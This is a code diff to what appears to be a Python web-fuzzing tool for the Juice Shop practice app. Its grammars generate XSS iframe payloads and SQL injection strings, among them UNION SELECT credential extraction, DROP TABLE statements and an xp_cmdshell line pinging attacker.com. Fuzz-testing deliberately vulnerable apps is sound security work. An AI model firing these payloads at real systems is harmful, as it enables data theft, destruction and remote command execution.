@@ -20,8 +20,8 @@ GUI_GRAMMAR: Grammar = ({
 
         "<text>": ["<string>"],
         "<string>": ["<character>", "<string><character>"],
-        "<character>": 
-            ["<letter>", "<digit>", "<special>"], 
+        "<character>":
+            ["<letter>", "<digit>", "<special>"],
 
         "<letter>": crange('a', 'z') + crange('A', 'Z'),
 
@@ -49,12 +49,12 @@ SQLI_GRAMMAR: Grammar = ({
         "<XSS>": ["<left>iframe src=\"javascript:alert(<single-quote>xss<single-quote>)\"<right>",
                   "<left>iframe id=\"xss-soundcloud\" width=\"100%\" height=\"166\" scrolling=\"no\" frameborder=\"no\" allow=\"autoplay\" src=\"https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true\"<right>"],
         "<left>": ["<"],
-        "<right>": [">"],        
+        "<right>": [">"],
 
         "<text>": ["<string>"],
         "<string>": ["<character>", "<string><character>"],
-        "<character>": 
-            ["<letter>", "<digit>", "<special>"], 
+        "<character>":
+            ["<letter>", "<digit>", "<special>"],
 
         "<letter>": crange('a', 'z') + crange('A', 'Z'),
 
@@ -73,15 +73,14 @@ SQLI_GRAMMAR: Grammar = ({
 
         "<hidden>": ["<string>"],
 
-        
-        "<email>": [# "<string>@<string>.<string>"],
-                     "<string>@<string>.<string><sqli>"], # enforce a SQLi payload in email generation 60% of the time
 
-        "<sqli>": [("<tautologies>", opts(prob=0.3)),
+        "<email>": ["<string>@<string>.<string><sqlia>"], # enforce a SQLi payload in email generation
+        
+        "<sqlia>": [("<tautologies>", opts(prob=0.3)),
                 ("<union>", opts(prob=0.5)),
                 ("<piggy-backed>", opts(prob=0.0)),
                 ("<illegal>", opts(prob=0.2))],
-        
+
         "<tautologies>": [
             "\\' OR \\'1\\'=\\'1",
             "\\' OR \\'1\\'=\\'1\\'--",
@@ -127,7 +126,7 @@ SQLI_GRAMMAR: Grammar = ({
             "admin\\' or 1=1--",
             "admin\\' or 1=1#"
         ],
-        
+
         "<union>": [
             "\\' UNION SELECT NULL--",
             "\\' UNION SELECT NULL,NULL--",
@@ -170,7 +169,7 @@ SQLI_GRAMMAR: Grammar = ({
             "\\' UNION SELECT id,username,password FROM users--",
             "\\' UNION SELECT schema_name FROM information_schema.schemata--"
         ],
-        
+
         "<piggy-backed>": [
             "\\'; DROP TABLE users--",
             "\\'; DROP TABLE users#",
@@ -201,7 +200,7 @@ SQLI_GRAMMAR: Grammar = ({
             "\\'; SELECT * FROM users INTO OUTFILE \\'/tmp/users.txt\\'--",
             "1\\'; EXEC master..xp_cmdshell \\'ping attacker.com\\'--"
         ],
-        
+
         "<illegal>": [
             "\\'",
             "\\'\\'",
@@ -265,12 +264,12 @@ class JuicyGrammarMiner(GUIGrammarMiner):
         for elem in form.find_elements(By.TAG_NAME, "input"):
             try:
                 input_type = elem.get_attribute("type")
-                input_name = elem.get_attribute("id") 
-            
+                input_name = elem.get_attribute("id")
+
                 if input_name is None or input_name == '':
                     input_name = elem.text
 
-                if input_name != 'loginButtonGoogle' and input_name != "": 
+                if input_name != 'loginButtonGoogle' and input_name != "":
                     if input_type in ["checkbox", "radio"]:
                         actions.add("check('%s', <boolean>)" % html.escape(input_name))
                     elif input_type in ["text", "number", "email", "password"]:
@@ -286,7 +285,7 @@ class JuicyGrammarMiner(GUIGrammarMiner):
                 pass
 
         return actions
-    
+
     def mine_button_element_actions(self) -> Set[str]:
         """Determine all button actions on the current Web page"""
 
@@ -302,7 +301,7 @@ class JuicyGrammarMiner(GUIGrammarMiner):
                 if button_name is None or button_name == '':
                     button_name = elem.text
 
-                if button_name != 'loginButtonGoogle' and button_name != "":        
+                if button_name != 'loginButtonGoogle' and button_name != "":
                     if button_type == "submit":
                         actions.add("submit('%s')" % html.escape(button_name))
                     elif button_type != "reset":
@@ -311,7 +310,7 @@ class JuicyGrammarMiner(GUIGrammarMiner):
                 pass
 
         return actions
-    
+
     def mine_search_field(self) -> Set[str]:
         actions = set()
 
@@ -322,12 +321,12 @@ class JuicyGrammarMiner(GUIGrammarMiner):
             return actions
         except NoSuchElementException:
             return actions
-    
+
     def mine_state_actions(self) -> FrozenSet[str]:
         """Return a set of all possible actions on the current Web site.
         Can be overloaded in subclasses."""
         if (self.XSS):
-            return frozenset(self.mine_search_field())    
-        
+            return frozenset(self.mine_search_field())
+
         return frozenset(self.mine_input_element_actions()
                          | self.mine_button_element_actions()) #TODO links are removed for now
